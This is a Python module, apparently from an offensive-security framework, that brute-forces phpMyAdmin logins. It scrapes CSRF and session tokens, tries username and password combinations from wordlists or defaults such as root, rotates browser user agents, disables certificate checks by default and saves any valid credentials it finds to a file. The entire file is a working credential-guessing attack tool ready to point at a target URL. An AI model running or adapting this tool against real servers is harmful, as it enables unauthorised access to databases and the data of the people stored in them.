"""
phpMyAdmin Bruteforce
"""

MODULE_INFO = {
    "description": "phpMyAdmin login bruteforce attack"
}

OPTIONS = {
    "target": {
        "type": "str",
        "description": "Target http/https",
        "required": True,
        "default": ""
    },
    "username": {
        "type": "str", 
        "description": "Username to bruteforce",
        "required": False,
        "default": "root"
    },
    "user_wordlist": {
        "type": "str",
        "description": "Path to username wordlist file",
        "required": False,
        "default": ""
    },
    "passwd_wordlist": {
        "type": "str",
        "description": "Path to password wordlist file", 
        "required": False,
        "default": ""
    },
    "custom_passwords": {
        "type": "str",
        "description": "Custom passwords",
        "required": False,
        "default": "root"
    },
    "headers_file": {
        "type": "str",
        "description": "Path to custom headers file",
        "required": False,
        "default": ""
    },
    "useragents_file": {
        "type": "str",
        "description": "Path to user agents file",
        "required": False,
        "default": ""
    },
    "threads": {
        "type": "int",
        "description": "Number of concurrent threads",
        "required": False,
        "default": 50
    },
    "timeout": {
        "type": "int",
        "description": "Request timeout in seconds",
        "required": False,
        "default": 10
    },
    "ignore_ssl": {
        "type": "bool",
        "description": "Ignore SSL certificate errors",
        "required": False,
        "default": True
    },
    "verify_ssl": {
        "type": "bool",
        "description": "Verify SSL certificate",
        "required": False,
        "default": True
    }
}

import urllib.request
import urllib.parse
import urllib
import threading
import http.cookiejar
import re
import sys
import time
import ssl
import random
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

class PhpMyAdminBruteforcer:
    def __init__(self, target, timeout=10, ignore_ssl=True, verify_ssl=False):
        self.target = target
        self.timeout = timeout
        self.ignore_ssl = ignore_ssl
        self.verify_ssl = verify_ssl
        self.found_credentials = []
        self.attempts = 0
        self.successful = 0
        
        # Setup SSL context
        self.ssl_context = self.create_ssl_context()
    
    def create_ssl_context(self):
        """Create SSL context based on settings"""
        context = ssl.create_default_context()
        
        if self.ignore_ssl or not self.verify_ssl:
            # Disable SSL verification
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        else:
            # Enable SSL verification
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
        
        return context
    
    def load_wordlist(self, filepath):
        """Load wordlist from file"""
        if not filepath or not os.path.exists(filepath):
            return []
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(lines)} items from {filepath}")
            return lines
        except Exception as e:
            print(f"[-] Error loading {filepath}: {e}")
            return []
    
    def load_headers(self, filepath):
        """Load custom headers from file"""
        headers = {}
        
        if not filepath or not os.path.exists(filepath):
            return headers
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
            print(f"[+] Loaded {len(headers)} headers from {filepath}")
        except Exception as e:
            print(f"[-] Error loading headers from {filepath}: {e}")
        
        return headers
    
    def get_default_user_agents(self):
        """Default user agents"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
        ]
    
    def create_opener(self):
        """Create URL opener with cookies and SSL support"""
        cookies = http.cookiejar.CookieJar()
        
        if self.target.startswith('https://'):
            # Create HTTPS handler with SSL context
            https_handler = urllib.request.HTTPSHandler(context=self.ssl_context)
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(cookies),
                https_handler
            )
        else:
            # Standard opener for HTTP
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(cookies)
            )
        
        return opener
    
    def make_request(self, url, data=None, headers=None, user_agents=None):
        """Make HTTP/HTTPS request with proper error handling"""
        try:
            if headers is None:
                headers = {}
            
            # Add common headers
            base_headers = {
                'User-Agent': random.choice(user_agents) if user_agents else random.choice(self.get_default_user_agents()),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
            base_headers.update(headers)
            
            if data:
                request = urllib.request.Request(url, data=data, headers=base_headers)
            else:
                request = urllib.request.Request(url, headers=base_headers)
            
            opener = self.create_opener()
            response = opener.open(request, timeout=self.timeout)
            return response, None
            
        except urllib.error.HTTPError as e:
            return None, f"HTTP Error {e.code}: {e.reason}"
        except urllib.error.URLError as e:
            if "CERTIFICATE_VERIFY_FAILED" in str(e):
                return None, f"SSL Certificate verification failed. Try setting ignore_ssl=True"
            return None, f"URL Error: {e.reason}"
        except ssl.SSLError as e:
            return None, f"SSL Error: {e}"
        except Exception as e:
            return None, f"Request Error: {str(e)}"
    
    def check_https_support(self):
        """Check if HTTPS is properly supported"""
        if self.target.startswith('https://'):
            print(f"[*] Testing HTTPS connection to {self.target}")
            try:
                test_response, error = self.make_request(self.target)
                if error:
                    if "SSL" in error or "CERTIFICATE" in error:
                        print(f"[!] HTTPS Error: {error}")
                        print("[!] Try setting ignore_ssl=True if using self-signed certificates")
                        return False
                    else:
                        print(f"[-] Connection error: {error}")
                        return False
                else:
                    print("[+] HTTPS connection successful")
                    return True
            except Exception as e:
                print(f"[-] HTTPS test failed: {e}")
                return False
        return True
    
    def check_login(self, username, password, custom_headers=None, user_agents=None):
        """Check single username/password combination"""
        try:
            self.attempts += 1
            print(f"[*] Attempt {self.attempts}: {username}/{password}")
            
            # Load login page to get tokens
            response, error = self.make_request(self.target, headers=custom_headers, user_agents=user_agents)
            if error:
                print(f"[-] Failed to load login page: {error}")
                return False
            
            fetch_token = response.read()
            response_text = fetch_token.decode('utf-8', errors='ignore')
            
            # Extract tokens - try multiple patterns
            token_match = re.findall(r'name="token" value="([\w\.-]+)"', response_text)
            session_match = re.findall(r'name="set_session" value="([\w\.-]+)"', response_text)
            
            # Alternative token patterns
            if not token_match:
                token_match = re.findall(r'token" value="([^"]+)"', response_text)
            if not session_match:
                session_match = re.findall(r'set_session" value="([^"]+)"', response_text)
            
            if not token_match or not session_match:
                print(f"[-] Failed to extract tokens - page might not be phpMyAdmin")
                # Check if it's actually phpMyAdmin
                if 'phpmyadmin' not in response_text.lower() and 'pma_username' not in response_text.lower():
                    print(f"[-] Target doesn't appear to be phpMyAdmin")
                    return False
                return False
            
            token = token_match[0]
            session = session_match[0]
            
            # Prepare login data
            login_data = urllib.parse.urlencode({
                'pma_username': username,
                'pma_password': password,
                'set_session': session,
                'token': token
            })
            
            login = login_data.encode('utf-8')
            
            # Add specific headers for login
            login_headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.target.split('/')[0] + '//' + self.target.split('/')[2],
                'Referer': self.target
            }
            if custom_headers:
                login_headers.update(custom_headers)
            
            # Send login request
            response, error = self.make_request(self.target, data=login, headers=login_headers, user_agents=user_agents)
            if error:
                print(f"[-] Login request failed: {error}")
                return False
            
            response_data = response.read()
            response_text = response_data.decode('utf-8', errors='ignore')
            
            # Check if login successful
            success_indicators = [
                "index.php?route=/logout",
                "main.php",
                "navigation.php", 
                "server_privileges.php",
                "Welcome to phpMyAdmin",
                "Database server",
                "MySQL server"
            ]
            
            for indicator in success_indicators:
                if indicator in response_text:
                    print(f"[+] SUCCESS! Found valid credentials: {username}/{password}")
                    self.successful += 1
                    self.found_credentials.append(f"{username}:{password}")
                    return True
            
            # Check for login failure indicators
            failure_indicators = [
                "Cannot log in",
                "Login without a password",
                "Access denied",
                "login form",
                "pma_username"
            ]
            
            login_failed = any(indicator in response_text for indicator in failure_indicators)
            
            if login_failed:
                print(f"[-] Failed: {username}/{password}")
            else:
                print(f"[-] Failed: {username}/{password} (unexpected response)")
                
            return False
                
        except Exception as e:
            print(f"[-] Error for {username}/{password}: {str(e)}")
            return False
    
    def bruteforce(self, usernames, passwords, custom_headers=None, user_agents=None, max_threads=10):
        """Perform bruteforce attack"""
        print(f"[*] Starting phpMyAdmin bruteforce attack")
        print(f"[*] Target: {self.target}")
        print(f"[*] Protocol: {'HTTPS' if self.target.startswith('https') else 'HTTP'}")
        print(f"[*] SSL Verification: {'Disabled' if self.ignore_ssl or not self.verify_ssl else 'Enabled'}")
        print(f"[*] Usernames: {len(usernames)}")
        print(f"[*] Passwords: {len(passwords)}")
        print(f"[*] Total combinations: {len(usernames) * len(passwords)}")
        print(f"[*] Threads: {max_threads}")
        print(f"[*] Timeout: {self.timeout}s")
        if custom_headers:
            print(f"[*] Custom headers: {len(custom_headers)}")
        if user_agents:
            print(f"[*] User agents: {len(user_agents)}")
        print("-" * 60)
        
        # Test HTTPS connection if needed
        if not self.check_https_support():
            print("[-] Cannot establish connection to target")
            return []
        
        start_time = time.time()
        
        # Generate all combinations
        combinations = []
        for username in usernames:
            for password in passwords:
                combinations.append((username, password))
        
        # Use ThreadPoolExecutor for thread management
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            future_to_combo = {
                executor.submit(self.check_login, user, pwd, custom_headers, user_agents): (user, pwd)
                for user, pwd in combinations
            }
            
            completed = 0
            for future in as_completed(future_to_combo):
                user, pwd = future_to_combo[future]
                completed += 1
                try:
                    future.result()
                except Exception as exc:
                    print(f"[-] {user}/{pwd} generated exception: {exc}")
                
                # Progress update every 10 attempts
                if completed % 10 == 0:
                    progress = (completed / len(combinations)) * 100
                    print(f"[*] Progress: {completed}/{len(combinations)} ({progress:.1f}%)")
        
        end_time = time.time()
        
        # Print summary
        print("\n" + "=" * 60)
        print("[*] BRUTEFORCE COMPLETED")
        print("=" * 60)
        print(f"[*] Total attempts: {self.attempts}")
        print(f"[*] Successful logins: {self.successful}")
        print(f"[*] Time elapsed: {end_time - start_time:.2f} seconds")
        print(f"[*] Speed: {self.attempts/(end_time - start_time):.2f} attempts/second")
        
        if self.found_credentials:
            print(f"\n[+] FOUND CREDENTIALS:")
            for cred in self.found_credentials:
                print(f"    {cred}")
            
            # Save to file
            timestamp = int(time.time())
            filename = f'phpmyadmin_credentials_{timestamp}.txt'
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"# phpMyAdmin Bruteforce Results\n")
                f.write(f"# Target: {self.target}\n")
                f.write(f"# Scan time: {time.ctime()}\n")
                f.write(f"# Protocol: {'HTTPS' if self.target.startswith('https') else 'HTTP'}\n")
                f.write(f"# Found {len(self.found_credentials)} valid credentials\n\n")
                for cred in self.found_credentials:
                    f.write(f"{cred}\n")
            print(f"[+] Credentials saved to: {filename}")
        else:
            print("[-] No valid credentials found")
        
        return self.found_credentials

def run(session, options):
    """Main function called by the framework"""
    target = options.get("target", "")
    username = options.get("username", "root")
    username_wordlist = options.get("user_wordlist", "")
    password_wordlist = options.get("passwd_wordlist", "")
    custom_passwords = options.get("custom_passwords", "123,password,admin,root,123456")
    headers_file = options.get("headers_file", "")
    useragents_file = options.get("useragents_file", "")
    threads = int(options.get("threads", 10))
    timeout = int(options.get("timeout", 10))
    ignore_ssl = options.get("ignore_ssl", True)
    verify_ssl = options.get("verify_ssl", True)
    
    if not target:
        print("[!] Error: Target option is required")
        return False
    
    # Normalize target URL
    if not target.startswith(('http://', 'https://')):
        # Try HTTPS first, then HTTP
        target = 'https://' + target
        print(f"[*] Added https:// prefix to target (will fallback to http if needed)")
    
    # Initialize bruteforcer
    bruteforcer = PhpMyAdminBruteforcer(target, timeout, ignore_ssl, verify_ssl)
    
    # Load usernames
    if username_wordlist:
        usernames = bruteforcer.load_wordlist(username_wordlist)
        if not usernames:
            print(f"[!] No usernames loaded from {username_wordlist}")
            return False
    else:
        usernames = [username]
    
    # Load passwords
    if password_wordlist:
        passwords = bruteforcer.load_wordlist(password_wordlist)
        if not passwords:
            print(f"[!] No passwords loaded from {password_wordlist}")
            return False
    else:
        passwords = [p.strip() for p in custom_passwords.split(',') if p.strip()]
    
    if not passwords:
        print("[!] Error: No passwords to try")
        return False
    
    # Load custom headers
    custom_headers = bruteforcer.load_headers(headers_file) if headers_file else None
    
    # Load user agents
    user_agents = bruteforcer.load_wordlist(useragents_file) if useragents_file else None
    
    try:
        # Start bruteforce attack
        found = bruteforcer.bruteforce(usernames, passwords, custom_headers, user_agents, threads)
        return len(found) > 0
        
    except KeyboardInterrupt:
        print("\n[!] Bruteforce interrupted by user")
        return False
    except Exception as e:
        print(f"[!] Bruteforce failed: {e}")
        return False
